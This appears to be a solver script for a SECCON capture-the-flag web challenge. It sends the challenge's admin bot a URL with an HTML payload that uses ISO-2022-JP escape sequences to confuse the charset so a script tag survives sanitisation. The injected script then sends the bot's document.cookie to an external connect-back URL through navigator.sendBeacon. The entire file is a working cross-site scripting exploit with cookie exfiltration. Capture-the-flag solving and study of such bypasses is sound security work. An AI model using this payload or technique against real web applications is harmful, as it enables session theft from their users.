const app = require("fastify")();
const assert = require("node:assert/strict");

const BOT_BASE_URL = `http://${process.env.SECCON_HOST ?? "localhost"}:1337`;
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");

const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const html = `
<textarea>&#x1b;$B</textarea><title>&#x1b;(B</title><a id="</textarea><script>"></a><textarea>";navigator.sendBeacon("${CONNECTBACK_URL}",document.cookie);"</textarea><a id="</script>"></a>
`.trim();

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(`http://web:3000/?html=${encodeURIComponent(html)}`);

  await sleep(5 * 1000);
  assert.fail("Failed");
});
